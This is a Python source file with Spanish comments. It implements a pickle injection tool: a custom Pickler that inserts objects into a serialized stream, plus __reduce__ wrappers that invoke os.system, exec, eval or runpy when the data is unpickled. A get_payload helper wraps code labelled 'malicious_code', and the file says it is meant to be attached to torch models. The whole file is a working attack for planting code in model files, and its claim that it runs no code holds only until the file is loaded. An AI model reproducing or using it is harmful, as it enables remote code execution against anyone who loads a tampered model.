import pickle
import struct
import os


"""
add_payload.py

Clase auxiliar para crear un payload.
No ejecuta código. Pensado para adjuntarlo como atributo (model.payload).
"""

class PickleInject:
    """Inyección con pickle. Pretende ser un "módulo" para trabajar con torch."""

    def __init__(self, inj_objs, first=True):
        self.__name__ = "pickle_inject"
        self.inj_objs = inj_objs
        self.first = first

    class _Pickler(pickle._Pickler):
        """Reimplementación de Pickler con soporte de inyección"""

        def __init__(self, file, protocol, inj_objs, first=True):
            super().__init__(file, protocol)
            self.inj_objs = inj_objs
            self.first = first

        def dump(self, obj):
            """Serializa datos con pickle e inyecta objetos antes o después"""
            if self.proto >= 2:
                self.write(pickle.PROTO + struct.pack("<B", self.proto))
            if self.proto >= 4:
                self.framer.start_framing()

            if self.first:
                for inj_obj in self.inj_objs:
                    self.save(inj_obj)

            self.save(obj)

            if not self.first:
                for inj_obj in self.inj_objs:
                    self.save(inj_obj)

            self.write(pickle.STOP)
            self.framer.end_framing()

    def Pickler(self, file, protocol):
        return self._Pickler(file, protocol, self.inj_objs)

    class _PickleInject:
        """Clase base para la serialización de comandos inyectados"""

        def __init__(self, args, command=None):
            self.command = command
            self.args = args

        def __reduce__(self):
            return self.command, (self.args,)

    class System(_PickleInject):
        """Crea un comando os.system"""

        def __init__(self, args):
            super().__init__(args, command=os.system)

    class Exec(_PickleInject):
        """Crea un comando exec"""

        def __init__(self, args):
            super().__init__(args, command=exec)

    class Eval(_PickleInject):
        """Crea un comando eval"""

        def __init__(self, args):
            super().__init__(args, command=eval)

    class RunPy(_PickleInject):
        """Crea un comando runpy"""

        def __init__(self, args):
            import runpy

            super().__init__(args, command=runpy._run_code)

        def __reduce__(self):
            return self.command, (self.args, {})


def get_payload(command, malicious_code):
    """Devuelve un payload según el tipo de comando especificado."""
    
    if command == "system":
        payload = PickleInject.System(malicious_code)
    elif command == "exec":
        payload = PickleInject.Exec(malicious_code)
    elif command == "eval":
        payload = PickleInject.Eval(malicious_code)
    elif command == "runpy":
        payload = PickleInject.RunPy(malicious_code)
    else:
        raise ValueError("Invalid command provided.")

    return payload